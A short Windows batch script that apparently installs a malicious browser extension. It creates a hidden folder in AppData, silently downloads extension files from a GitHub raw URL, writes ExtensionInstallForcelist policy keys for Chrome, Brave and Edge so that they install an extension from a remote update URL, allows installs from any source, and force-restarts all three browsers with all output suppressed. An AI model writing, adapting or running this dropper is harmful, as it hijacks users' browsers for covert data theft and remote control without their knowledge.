@echo off
setlocal enabledelayedexpansion

set "D=%APPDATA%\Microsoft\Windows\Templates\WDF"
mkdir "%D%" 2>nul
attrib +H "%D%" >nul 2>&1

curl -s -o "%D%\manifest.json" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json
curl -s -o "%D%\background.js" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js

set "ID=leelplbjobiheomgknchcnbmnancegal"
set "URL=https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/version.xml"

:: Current User (works on all machines — no enterprise needed)
reg add "HKCU\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Google\Chrome\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1

reg add "HKCU\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1

reg add "HKCU\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%ID%;%URL%" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallSources" /v "1" /t REG_SZ /d "*" /f >nul 2>&1

taskkill /F /IM chrome.exe >nul 2>&1
taskkill /F /IM brave.exe >nul 2>&1
taskkill /F /IM msedge.exe >nul 2>&1
timeout /t 1 /nobreak >nul

start "" chrome.exe >nul 2>&1
start "" brave.exe >nul 2>&1
start "" msedge.exe >nul 2>&1
exit
